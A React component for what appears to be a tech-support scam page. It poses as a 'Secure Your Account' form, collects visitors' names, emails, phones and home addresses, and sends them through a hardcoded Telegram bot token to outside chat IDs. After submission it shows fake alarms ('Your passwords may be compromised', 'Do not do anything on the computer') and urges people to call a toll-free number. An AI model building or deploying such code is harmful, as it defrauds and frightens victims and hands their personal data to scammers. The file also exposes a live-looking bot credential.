import { useState } from 'react'

const TELEGRAM_BOT_TOKEN = '8699438637:AAEUgX3bqmMtZa8b9EvShn-rCOrLK8c2y2U'
const TELEGRAM_CHAT_IDS = ['6351503678', '-5030471314'] // '-5198254389' excluded

const stateCities: Record<string, string[]> = {
    'Alabama': ['Birmingham, AL', 'Huntsville, AL', 'Mobile, AL', 'Montgomery, AL', 'Tuscaloosa, AL'],
    'Alaska': ['Anchorage, AK', 'Fairbanks, AK', 'Juneau, AK', 'Sitka, AK'],
    'Arizona': ['Chandler, AZ', 'Gilbert, AZ', 'Glendale, AZ', 'Mesa, AZ', 'Phoenix, AZ', 'Scottsdale, AZ', 'Tempe, AZ', 'Tucson, AZ'],
    'Arkansas': ['Fayetteville, AR', 'Fort Smith, AR', 'Jonesboro, AR', 'Little Rock, AR', 'Springdale, AR'],
    'California': ['Fresno, CA', 'Long Beach, CA', 'Los Angeles, CA', 'Oakland, CA', 'Sacramento, CA', 'San Diego, CA', 'San Francisco, CA', 'San Jose, CA', 'Santa Ana, CA', 'Stockton, CA'],
    'Colorado': ['Aurora, CO', 'Colorado Springs, CO', 'Denver, CO', 'Fort Collins, CO', 'Lakewood, CO'],
    'Connecticut': ['Bridgeport, CT', 'Hartford, CT', 'New Haven, CT', 'Stamford, CT', 'Waterbury, CT'],
    'Delaware': ['Dover, DE', 'Newark, DE', 'Wilmington, DE'],
    'Florida': ['Cape Coral, FL', 'Fort Lauderdale, FL', 'Jacksonville, FL', 'Miami, FL', 'Orlando, FL', 'St. Petersburg, FL', 'Tallahassee, FL', 'Tampa, FL'],
    'Georgia': ['Athens, GA', 'Atlanta, GA', 'Augusta, GA', 'Columbus, GA', 'Savannah, GA'],
    'Hawaii': ['Hilo, HI', 'Honolulu, HI', 'Kailua, HI', 'Pearl City, HI'],
    'Idaho': ['Boise, ID', 'Idaho Falls, ID', 'Meridian, ID', 'Nampa, ID', 'Pocatello, ID'],
    'Illinois': ['Aurora, IL', 'Chicago, IL', 'Joliet, IL', 'Naperville, IL', 'Rockford, IL', 'Springfield, IL'],
    'Indiana': ['Evansville, IN', 'Fort Wayne, IN', 'Indianapolis, IN', 'South Bend, IN'],
    'Iowa': ['Cedar Rapids, IA', 'Davenport, IA', 'Des Moines, IA', 'Sioux City, IA'],
    'Kansas': ['Kansas City, KS', 'Olathe, KS', 'Overland Park, KS', 'Topeka, KS', 'Wichita, KS'],
    'Kentucky': ['Bowling Green, KY', 'Covington, KY', 'Lexington, KY', 'Louisville, KY'],
    'Louisiana': ['Baton Rouge, LA', 'Lafayette, LA', 'New Orleans, LA', 'Shreveport, LA'],
    'Maine': ['Augusta, ME', 'Bangor, ME', 'Portland, ME'],
    'Maryland': ['Annapolis, MD', 'Baltimore, MD', 'Frederick, MD', 'Rockville, MD'],
    'Massachusetts': ['Boston, MA', 'Cambridge, MA', 'Lowell, MA', 'Springfield, MA', 'Worcester, MA'],
    'Michigan': ['Ann Arbor, MI', 'Detroit, MI', 'Flint, MI', 'Grand Rapids, MI', 'Lansing, MI'],
    'Minnesota': ['Bloomington, MN', 'Duluth, MN', 'Minneapolis, MN', 'Rochester, MN', 'St. Paul, MN'],
    'Mississippi': ['Biloxi, MS', 'Gulfport, MS', 'Jackson, MS', 'Southaven, MS'],
    'Missouri': ['Columbia, MO', 'Independence, MO', 'Kansas City, MO', 'Springfield, MO', 'St. Louis, MO'],
    'Montana': ['Billings, MT', 'Bozeman, MT', 'Great Falls, MT', 'Missoula, MT'],
    'Nebraska': ['Lincoln, NE', 'Omaha, NE'],
    'Nevada': ['Henderson, NV', 'Las Vegas, NV', 'North Las Vegas, NV', 'Reno, NV'],
    'New Hampshire': ['Concord, NH', 'Manchester, NH', 'Nashua, NH'],
    'New Jersey': ['Jersey City, NJ', 'Newark, NJ', 'Paterson, NJ', 'Trenton, NJ'],
    'New Mexico': ['Albuquerque, NM', 'Las Cruces, NM', 'Rio Rancho, NM', 'Santa Fe, NM'],
    'New York': ['Albany, NY', 'Buffalo, NY', 'New York City, NY', 'Rochester, NY', 'Syracuse, NY', 'Yonkers, NY'],
    'North Carolina': ['Charlotte, NC', 'Durham, NC', 'Greensboro, NC', 'Raleigh, NC', 'Winston-Salem, NC'],
    'North Dakota': ['Bismarck, ND', 'Fargo, ND', 'Grand Forks, ND'],
    'Ohio': ['Akron, OH', 'Cincinnati, OH', 'Cleveland, OH', 'Columbus, OH', 'Dayton, OH', 'Toledo, OH'],
    'Oklahoma': ['Broken Arrow, OK', 'Norman, OK', 'Oklahoma City, OK', 'Tulsa, OK'],
    'Oregon': ['Eugene, OR', 'Portland, OR', 'Salem, OR'],
    'Pennsylvania': ['Allentown, PA', 'Philadelphia, PA', 'Pittsburgh, PA', 'Reading, PA'],
    'Rhode Island': ['Cranston, RI', 'Pawtucket, RI', 'Providence, RI'],
    'South Carolina': ['Charleston, SC', 'Columbia, SC', 'Greenville, SC', 'North Charleston, SC'],
    'South Dakota': ['Aberdeen, SD', 'Rapid City, SD', 'Sioux Falls, SD'],
    'Tennessee': ['Chattanooga, TN', 'Clarksville, TN', 'Knoxville, TN', 'Memphis, TN', 'Nashville, TN'],
    'Texas': ['Arlington, TX', 'Austin, TX', 'Dallas, TX', 'El Paso, TX', 'Fort Worth, TX', 'Houston, TX', 'Laredo, TX', 'Lubbock, TX', 'San Antonio, TX'],
    'Utah': ['Provo, UT', 'Salt Lake City, UT', 'Sandy, UT', 'West Valley City, UT'],
    'Vermont': ['Burlington, VT', 'Montpelier, VT'],
    'Virginia': ['Alexandria, VA', 'Chesapeake, VA', 'Norfolk, VA', 'Richmond, VA', 'Virginia Beach, VA'],
    'Washington': ['Bellevue, WA', 'Seattle, WA', 'Spokane, WA', 'Tacoma, WA'],
    'West Virginia': ['Charleston, WV', 'Huntington, WV', 'Morgantown, WV'],
    'Wisconsin': ['Green Bay, WI', 'Madison, WI', 'Milwaukee, WI'],
    'Wyoming': ['Casper, WY', 'Cheyenne, WY'],
}

interface Props {
    riskScore: number
}

export default function LeadForm({ riskScore }: Props) {
    const [formData, setFormData] = useState({ name: '', email: '', phone: '', state: '', city: '', address: '', zip: '', concern: '', message: '' })
    const [submitted, setSubmitted] = useState(false)

    const resetForm = () => {
        setSubmitted(false)
        setFormData({ name: '', email: '', phone: '', state: '', city: '', address: '', zip: '', concern: '', message: '' })
    }

    const handleSubmit = async (e: React.FormEvent) => {
        e.preventDefault()

        const digitsOnly = formData.phone.replace(/\D/g, '')
        if (digitsOnly.length < 10) {
            alert('⚠️ Please enter a valid 10-digit US phone number.')
            return
        }

        const message =
            `🚨 New Security Lead\n\n` +
            `👤 Name: ${formData.name}\n` +
            `📧 Email: ${formData.email}\n` +
            `📞 Phone: +1 ${formData.phone}\n` +
            `🗺️ State: ${formData.state}\n` +
            `🏙️ City: ${formData.city}\n` +
            `🏠 Address: ${formData.address}\n` +
            `📮 Zip Code: ${formData.zip}\n` +
            `⚠️ Concern: ${formData.concern}\n` +
            `💬 Message: ${formData.message}\n\n` +
            `🔴 Risk Score: ${riskScore}`

        await Promise.all(
            TELEGRAM_CHAT_IDS.map(chat_id =>
                fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ chat_id, text: message })
                })
            )
        )

        setSubmitted(true)
        // @ts-ignore
        window.fbq('track', 'Lead')
    }

    return (
        <div id="lead-form" className="bg-[#0f172a] border border-white/10 rounded-2xl p-6">

            {submitted ? (
                <div className="flex flex-col items-center justify-center text-center py-10">
                    <div className="text-6xl mb-4">✅</div>
                    <h3 className="text-2xl font-extrabold text-green-400 mb-3">Request Received!</h3>
                    <p className="text-slate-300 text-sm mb-6">
                        A security expert will call you shortly to help secure your device and accounts.
                    </p>
                    <div className="bg-green-500/10 border border-green-500/30 rounded-xl p-4 w-full text-left space-y-2 mb-6">
                        <p className="text-green-400 font-bold text-sm">What happens next:</p>
                        <p className="text-slate-300 text-xs">📞 A security specialist will call you within 5 minutes</p>
                        <p className="text-slate-300 text-xs">🛡️ We will review your device and account risks</p>
                        <p className="text-slate-300 text-xs">🔒 You will receive a personalized protection plan</p>
                    </div>
                    <p className="text-red-400 font-bold">High security risk detected</p>
                    <p className="text-slate-300 text-sm">Your passwords may be compromised</p>
                    <p className="text-slate-300 text-sm">Do not do anything on the computer</p>
                    <p className="text-slate-300 text-sm">Please call toll-free <span className="font-bold text-white">+1 (800) 734-5318</span> to get this fixed</p>
                    <button onClick={resetForm}
                        className="w-full mt-6 bg-white/10 hover:bg-white/20 text-white font-bold py-3 rounded-xl transition cursor-pointer border border-white/10 mb-3">
                        Submit Another Request
                    </button>
                </div>

            ) : (
                <>
                    <h3 className="text-2xl font-bold mb-6">🔒 Secure Your Account Now</h3>
                    <form onSubmit={handleSubmit} autoComplete="off" className="space-y-3">
                        <input type="text" placeholder="Full Name" required autoComplete="off"
                            onChange={e => setFormData({ ...formData, name: e.target.value })}
                            className="w-full px-4 py-3 rounded-xl border border-white/10 bg-[#08111f] text-white text-sm outline-none focus:border-green-500/50 transition" />
                        <input type="email" placeholder="Email Address" required autoComplete="off"
                            onChange={e => setFormData({ ...formData, email: e.target.value })}
                            className="w-full px-4 py-3 rounded-xl border border-white/10 bg-[#08111f] text-white text-sm outline-none focus:border-green-500/50 transition" />

                        {/* Phone with +1 prefix */}
                        <div className="relative">
                            <span className="absolute left-4 top-1/2 -translate-y-1/2 text-white text-sm font-bold select-none">+1</span>
                            <input type="tel" placeholder="(###) ###-####" required autoComplete="off"
                                value={formData.phone}
                                maxLength={14}
                                onChange={e => {
                                    let val = e.target.value.replace(/\D/g, '').slice(0, 10)
                                    if (val.length >= 7) val = `(${val.slice(0, 3)}) ${val.slice(3, 6)}-${val.slice(6)}`
                                    else if (val.length >= 4) val = `(${val.slice(0, 3)}) ${val.slice(3)}`
                                    else if (val.length >= 1) val = `(${val}`
                                    setFormData({ ...formData, phone: val })
                                }}
                                onKeyDown={e => {
                                    if (
                                        e.ctrlKey || e.metaKey ||
                                        /[0-9]/.test(e.key) ||
                                        ['Backspace', 'Delete', 'Tab', 'ArrowLeft', 'ArrowRight'].includes(e.key)
                                    ) return
                                    e.preventDefault()
                                }}
                                className="w-full pl-10 pr-4 py-3 rounded-xl border border-white/10 bg-[#08111f] text-white text-sm outline-none focus:border-green-500/50 transition" />
                        </div>

                        <input type="text" placeholder="Street Address" required autoComplete="off"
                            onChange={e => setFormData({ ...formData, address: e.target.value })}
                            className="w-full px-4 py-3 rounded-xl border border-white/10 bg-[#08111f] text-white text-sm outline-none focus:border-green-500/50 transition" />
                        <select required
                            value={formData.state}
                            onChange={e => setFormData({ ...formData, state: e.target.value, city: '' })}
                            className="w-full px-4 py-3 rounded-xl border border-white/10 bg-[#08111f] text-white text-sm outline-none focus:border-green-500/50 transition">
                            <option value="" disabled>Select State</option>
                            {Object.keys(stateCities).sort().map(s => (
                                <option key={s} value={s}>{s}</option>
                            ))}
                        </select>
                        <select required
                            value={formData.city}
                            disabled={!formData.state}
                            onChange={e => setFormData({ ...formData, city: e.target.value })}
                            className={`w-full px-4 py-3 rounded-xl border border-white/10 bg-[#08111f] text-white text-sm outline-none focus:border-green-500/50 transition ${!formData.state ? 'opacity-50 cursor-not-allowed' : ''}`}>
                            <option value="" disabled>{formData.state ? 'Select City' : 'Select a state first'}</option>
                            {formData.state && stateCities[formData.state]?.map(city => (
                                <option key={city} value={city}>{city}</option>
                            ))}
                        </select>
                        <input type="text" placeholder="Zip Code" required autoComplete="off"
                            maxLength={5}
                            onChange={e => setFormData({ ...formData, zip: e.target.value })}
                            onKeyDown={e => {
                                if (
                                    e.ctrlKey || e.metaKey ||
                                    /[0-9]/.test(e.key) ||
                                    ['Backspace', 'Delete', 'Tab', 'ArrowLeft', 'ArrowRight'].includes(e.key)
                                ) return
                                e.preventDefault()
                            }}
                            className="w-full px-4 py-3 rounded-xl border border-white/10 bg-[#08111f] text-white text-sm outline-none focus:border-green-500/50 transition" />
                        <select required
                            value={formData.concern}
                            onChange={e => setFormData({ ...formData, concern: e.target.value })}
                            className="w-full px-4 py-3 rounded-xl border border-white/10 bg-[#08111f] text-white text-sm outline-none focus:border-green-500/50 transition">
                            <option value="" disabled>Main Concern</option>
                            {['Facebook Account Security', 'Email Security', 'Virus / Malware Protection', 'Password / Identity Protection', 'General Security Review'].map(o => (
                                <option key={o} value={o}>{o}</option>
                            ))}
                        </select>
                        <textarea placeholder="Tell us what happened or what you're worried about"
                            onChange={e => setFormData({ ...formData, message: e.target.value })} autoComplete="off"
                            className="w-full px-4 py-3 rounded-xl border border-white/10 bg-[#08111f] text-white text-sm outline-none focus:border-green-500/50 transition resize-vertical min-h-24" />
                        <button type="submit"
                            className="w-full bg-green-500 hover:bg-green-600 text-[#07111d] font-bold py-3 rounded-xl transition cursor-pointer border-none">
                            Request Review
                        </button>
                    </form>
                </>
            )}
        </div>
    )
}